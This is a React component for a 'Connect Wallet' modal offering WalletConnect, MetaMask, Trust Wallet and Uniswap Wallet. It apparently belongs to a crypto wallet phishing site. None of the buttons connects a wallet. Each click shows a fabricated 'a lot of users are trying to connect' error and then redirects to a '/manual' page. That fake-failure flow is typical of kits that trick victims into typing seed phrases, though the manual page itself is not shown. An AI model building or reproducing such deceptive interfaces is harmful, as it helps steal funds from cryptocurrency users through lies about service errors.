import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import connect from "../assets/modal-2 icons/connect.webp";
import meta from "../assets/modal-2 icons/meta.webp";
import trust from "../assets/modal-2 icons/trust.webp";
import uniswap from "../assets/modal-2 icons/uniswap.webp";
import { PiDotsNineBold } from "react-icons/pi";
import { FaRegQuestionCircle } from "react-icons/fa";
import { toast, ToastContainer } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import { Link } from 'react-router-dom';

const Modal_two = ({ closeModal }) => {
  const [loading, setLoading] = useState(false);
  const [isClosing, setIsClosing] = useState(false);
  const navigate = useNavigate();

  const handleWalletClick = (walletName) => {
    setLoading(true);
    toast.info(`A lot of users are trying to connect. Please try connecting manually via ${walletName}.`, {
      position: "top-right",
      autoClose: 5000,
      hideProgressBar: false,
      closeOnClick: true,
      pauseOnHover: true,
      draggable: true,
      progress: undefined,
    });
    setTimeout(() => {
      
      navigate('/manual');
    }, 4000);
  };

  const handleClose = () => {
    setIsClosing(true);
    setTimeout(() => {
      closeModal();
    }, 300);
  };

  return (
    <div className={`fixed inset-0 z-50 flex items-center justify-center bg-[#000000a9] transition-opacity duration-300 ${
      isClosing ? 'opacity-0' : 'opacity-100'
    }`}>
      <div className={`bg-white w-[370px] h-[480px] rounded-[30px] py-6 px-5 font-bold gap-4 grid relative transform transition-all duration-300 ease-out ${
        isClosing ? 'scale-95 opacity-0' : 'scale-100 opacity-100'
      }`}>
        <div className='flex justify-between items-center px-4 mb-5'>
          <FaRegQuestionCircle />
          <h1>Connect Wallet</h1>
          <button className=' text-red-600 text-[20px] font-bold' onClick={handleClose}>X</button>
        </div>

        <div className='grid gap-4'>
          <div className='flex items-center justify-between bg-[#FAFAFA] px-2 py-1.5 rounded-[15px]' onClick={() => handleWalletClick('WalletConnect')}>
            <div className='cursor-pointer flex items-center gap-2'>
              <img className='w-11 rounded-[10px]' src={connect} alt="WalletConnect" />
              <h1>WalletConnect</h1>
            </div>
            <div className='text-[10px] bg-[#E4E8FB] text-[#667DFF] p-1 rounded-[5px]'>
              <h4>QR CODE</h4>
            </div>
          </div>

          <div className='cursor-pointer flex items-center gap-2 bg-[#FAFAFA] px-2 py-1.5 rounded-[15px]' onClick={() => handleWalletClick('MetaMask')}>
            <img className='w-11 rounded-[10px]' src={meta} alt="MetaMask" />
            <h1>MetaMask</h1>
          </div>

          <div className='cursor-pointer flex items-center gap-2 bg-[#FAFAFA] px-2 py-1.5 rounded-[15px]' onClick={() => handleWalletClick('Trust Wallet')}>
            <img className='w-11 rounded-[10px]' src={trust} alt="Trust Wallet" />
            <h1>Trust Wallet</h1>
          </div>

          <div className='cursor-pointer flex items-center gap-2 bg-[#FAFAFA] px-2 py-1.5 rounded-[15px]' onClick={() => handleWalletClick('Uniswap Wallet')}>
            <img className='w-11 rounded-[10px]' src={uniswap} alt="Uniswap Wallet" />
            <h1>Uniswap Wallet</h1>
          </div>

        <Link to='manual'>
          <div className='flex items-center justify-between bg-[#FAFAFA] px-2 py-1.5 rounded-[15px]'>
            <div className=' cursor-pointer flex items-center gap-2'>
              <PiDotsNineBold color='#667DFF' size={44} />
              <h1>All Wallets</h1>
            </div>
            <div className='text-[11px] bg-[#E1E1E1] text-[#798686] p-1 rounded-[5px]'>
              <h3>430+</h3>
            </div>
          </div>
          </Link>
        </div>

        <h3 className='text-center text-[13px] text-[#798686]'>
          Haven't got a wallet? <span className='text-[14px] text-[#667DFF] cursor-pointer'>Get started</span>
        </h3>

        {/* Toast container */}
        <ToastContainer />
      </div>
    </div>
  );
};

export default Modal_two;
